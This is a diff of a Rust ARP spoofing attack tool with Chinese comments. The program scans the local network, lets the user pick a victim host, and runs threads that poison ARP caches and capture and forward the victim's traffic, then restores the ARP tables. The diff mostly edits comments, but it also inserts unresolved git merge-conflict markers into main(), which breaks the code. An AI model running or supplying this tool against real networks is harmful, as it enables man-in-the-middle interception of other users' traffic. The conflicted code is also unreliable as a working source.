@@ -24,10 +24,7 @@ const ETHERNET_HEADER_LEN: usize = 14;
 const ARP_PACKET_LEN: usize = 28;
 const MIN_BUFFER_SIZE: usize = ETHERNET_HEADER_LEN + ARP_PACKET_LEN;
 
-// =========================================================================
 // 辅助函数
-// =========================================================================
-
 fn send_arp_packet(
     tx: &mut Box<dyn DataLinkSender>, 
     interface_mac: MacAddr, 
@@ -91,7 +88,7 @@ fn arp_ping(
     timeout: Duration,
 ) -> Option<MacAddr> {
     
-    // 1. 发送 ARP Request
+    // 发送 ARP Request
     {
         let mut tx_lock = tx_mutex.lock().unwrap();
         let _ = send_arp_packet(
@@ -106,7 +103,7 @@ fn arp_ping(
         );
     }
 
-    // 2. 接收 ARP Reply
+    // 接收 ARP Reply
     let start = Instant::now();
     while start.elapsed() < timeout {
         
@@ -131,10 +128,7 @@ fn arp_ping(
     None
 }
 
-// =========================================================================
 // 核心主函数
-// =========================================================================
-
 fn main() {
     println!("=== ARP 欺骗攻击工具 ===\n");
 
@@ -194,7 +188,11 @@ fn main() {
     let gateway_ip = Ipv4Addr::from(base + 1);
     println!("猜测网关地址: {}\n", gateway_ip);
 
+<<<<<<< HEAD
     // --- Step 5: 扫描局域网 ---
+=======
+    // 扫描局域网
+>>>>>>> 0ce5f1941b243c266251996cd8c61bfd2d9fbe63
     println!("开始扫描局域网中的在线主机 (串行)...");
     let start = Instant::now();
     let ips: Vec<Ipv4Addr> = (1..255)
@@ -228,7 +226,11 @@ fn main() {
         println!("[{:02}] {:<15}  {}", i, ip, mac);
     }
 
+<<<<<<< HEAD
     // --- Step 6 & 7: 用户选择目标并获取 MAC ---
+=======
+    // 用户选择目标并获取 MAC
+>>>>>>> 0ce5f1941b243c266251996cd8c61bfd2d9fbe63
     print!("\n请输入目标主机编号或 IP: ");
     io::stdout().flush().unwrap();
     input.clear();
@@ -265,7 +267,7 @@ fn main() {
         target_ip, target_mac, gateway_ip, gateway_mac
     );
 
-    // --- Step 8: 进入欺骗和转发环节 ---
+    // 进入欺骗和转发环节
     let running = Arc::new(AtomicBool::new(true));
     let r_send = running.clone();
     let r_fwd = running.clone();
@@ -273,7 +275,7 @@ fn main() {
 
     println!("开始 ARP 欺骗攻击... 按 Ctrl+C 停止。\n");
 
-    // 1. 欺骗发送线程
+    // 欺骗发送线程
     let tx_poison = tx_main.clone(); 
     let sender_handle = thread::spawn(move || {
         while r_send.load(Ordering::SeqCst) {
@@ -296,7 +298,7 @@ fn main() {
         }
     });
 
-    // 2. 流量捕获和转发线程
+    // 流量捕获和转发线程
     let my_mac_fwd = my_mac;
     let target_ip_fwd = target_ip;
     let target_mac_fwd = target_mac;
@@ -360,7 +362,7 @@ fn main() {
         }
     });
 
-    // 3. 主线程等待 Ctrl+C 信号
+    // 主线程等待 Ctrl+C 信号
     ctrlc::set_handler(move || {
         println!("\n[主线程] 接收到 Ctrl+C，正在终止攻击...");
         r_main.store(false, Ordering::SeqCst);
@@ -374,7 +376,11 @@ fn main() {
     let _ = sender_handle.join();
     let _ = forwarder_handle.join(); 
 
+<<<<<<< HEAD
     // --- Step 9: ARP 恢复机制 ---
+=======
+    // ARP 恢复机制
+>>>>>>> 0ce5f1941b243c266251996cd8c61bfd2d9fbe63
     println!("\n攻击结束，恢复 ARP 表...");
     
     // 重新打开一个独立的发送通道用于恢复
